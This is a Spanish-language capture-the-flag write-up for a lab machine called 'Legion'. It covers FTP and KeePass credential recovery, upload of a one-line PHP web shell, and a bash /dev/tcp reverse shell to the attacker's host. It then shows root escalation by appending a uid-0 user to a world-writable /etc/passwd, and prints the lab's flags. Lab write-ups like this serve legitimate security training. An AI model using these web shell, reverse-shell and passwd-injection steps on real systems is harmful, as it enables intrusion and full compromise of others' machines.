# Manual de Pentesting - Maquina: **Legion**

## 1. Escaneo de puertos y servicios

### Comando utilizado:

```
nmap -sC -sV -oN nmap-inicial 10.10.50.164
```

### Puertos abiertos:

- **21/tcp (FTP)** — vsftpd 3.0.3
    
- **80/tcp (HTTP)** — Apache httpd 2.4.56
    

---

## 2. Análisis del servicio FTP

### Acceso anónimo:

Se intentó el acceso anónimo:

```
ftp 10.10.50.164
```

- Usuario: `anonymous`
    
- Contraseña: (vacía)
    

Ingreso exitoso. Se listaron los archivos:

```
ls
```

Se descargaron:

```
get key.keyx
get mydb.kdbx
```

Archivos descargados:

- `key.keyx`
    
- `mydb.kdbx`
    

---

## 3. Exploración del servicio HTTP

### Navegación manual:

Acceso mediante navegador:

```
http://10.10.50.164
```

Se visualizó una página inicial simple (`index.html`).

### Fuzzing de directorios:

```
dirb http://10.10.50.164/
```

No se encontraron directorios útiles adicionales en esta etapa.

---

## 4. Análisis del archivo KeePass (.kdbx)

### Herramienta utilizada:

```
sudo apt install keepassxc
keepassxc mydb.kdbx
```

Se cargó la base de datos `mydb.kdbx` utilizando el archivo llave `key.keyx`.

Credenciales obtenidas:

- Usuario: **gfawkes**
    
- Contraseña: **Gunpowder1605Plot**
    

---

## 5. Acceso con nuevas credenciales por FTP

### Conexión:

```
ftp 10.10.50.164
Username: gfawkes
Password: Gunpowder1605Plot
```

Una vez dentro se descubrió el directorio:

- `/secretuploads/`
    

Desde Kali se creó el archivo `shell2.php` con el siguiente contenido:

```
<?php system($_GET['cmd']); ?>
```

Se subió con:

```
put shell2.php
```

### Navegación:

```
http://10.10.50.164/secretuploads/shell2.php?cmd=whoami
```

Conexión obtenida como `www-data`.

---

## 6. Obtención de una Reverse Shell

### Listener en Kali:

```
nc -nlvp 4444
```

### Ejecución de la reverse shell en navegador:

```
http://10.10.50.164/secretuploads/shell2.php?cmd=bash -c 'bash -i >& /dev/tcp/10.8.0.8/4444 0>&1'
```


Cambio de usuario:

```
su gfawkes
# Password: Gunpowder1605Plot
```

**Flag de usuario obtenida:**

```
cat /home/gfawkes/user.txt
218827f3d2ebff25c96af6aa1bcbe1df
```

---

## 7. Escalada de privilegios a root

### Análisis:

Se identificaron archivos escribibles por root con:

```
find / -writable -not -path "/proc/*" -user root 2>/dev/null
```

Entre ellos, se encontró:

- `/etc/passwd`
    

Se verificaron sus permisos:

```
ls -l /etc/passwd
# -rw-rw-rw- 1 root root 1187 Jan  7 17:19 /etc/passwd
```

Se validó su contenido:

```
cat /etc/passwd
```

### Creación de un nuevo usuario root:

Generación del hash (realizada desde Kali):

```
openssl passwd -1 -salt saul Escal4d0r!
# $1$saul$tUZi0uhpKXzJ3Hlt1dSAo0
```

Inyección del usuario en `/etc/passwd`:

```
echo 'saul:$1$saul$tUZi0uhpKXzJ3Hlt1dSAo0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Cambio de usuario:

```
su saul
# Password: Escal4d0r!
```

Confirmación:

```
whoami && id
root
```

**Flag de root obtenida:**

```
cat /root/root.txt
2e8266e1be13ed5d7defb2d331da7a6e
```

---

## 8. Herramientas utilizadas

- `nmap`
    
- `ftp`
    
- `dirb`
    
- `keepassxc`
    
- `openssl`
    
- `nc (netcat)`
    

---

## 9. Resumen del ataque

1. Acceso anónimo FTP para obtener `mydb.kdbx` y `key.keyx`.
    
2. Crackeo de la base de datos KeePass con `keepassxc`.
    
3. Login FTP como `gfawkes` y descubrimiento de `/secretuploads`.
    
4. Creación y subida de `shell2.php`.
    
5. Reverse shell a Kali.
    
6. Cambio de usuario a `gfawkes`.
    
7. Escalada de privilegios editando `/etc/passwd`.
    
8. Acceso como `root` y captura de ambas flags.